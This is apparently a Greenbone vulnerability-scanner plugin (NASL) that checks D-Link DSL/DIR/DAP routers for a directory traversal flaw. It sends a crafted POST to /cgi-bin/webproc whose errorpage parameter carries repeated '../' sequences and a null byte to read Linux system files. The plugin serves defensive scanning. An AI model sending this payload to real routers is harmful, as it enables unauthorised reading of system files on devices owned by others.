CPE_PREFIX = "cpe:/o:d-link";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.813804" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2018-07-25 10:11:37 +0530 (Wed, 25 Jul 2018)" );
	script_name( "D-Link DSL/DIR/DAP Devices Directory Traversal And Cross Site Scripting Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_dlink_dsl_detect.sc", "gb_dlink_dap_detect.sc", "gb_dlink_dir_detect.sc", "gb_dlink_dwr_detect.sc" );
	script_mandatory_keys( "Host/is_dlink_device" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/45084" );
	script_tag( name: "summary", value: "The host is a D-Link DSL/DIR/DAP router
  and is prone to path traversal and cross site scripting vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send the crafted HTTP POST request
  and check whether it is possible to read a file on the filesystem or not." );
	script_tag( name: "insight", value: "Multiple flaws are due to an insufficient
  validation for errorpage parameter." );
	script_tag( name: "impact", value: "Successful exploitation will allow a remote
  attacker to read arbitrary files on the target system and execute arbitrary
  script further leading to authentication bypass easily." );
	script_tag( name: "affected", value: "D-Link DSL-2877AL with Firmware Version
  ME_1.08. Other devices, models or versions might be also affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!infos = get_app_port_from_cpe_prefix( cpe: CPE_PREFIX, service: "www" )){
	exit( 0 );
}
port = infos["port"];
CPE = infos["cpe"];
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files( "linux" );
url = dir + "/cgi-bin/webproc";
for pattern in keys( files ) {
	file = files[pattern];
	data = "getpage=html%2Findex.html&errorpage=" + crap( data: "../", length: 3 * 12 ) + file + "%00&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin";
	req = http_post_put_req( port: port, url: url, data: data );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) && egrep( string: buf, pattern: pattern, icase: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

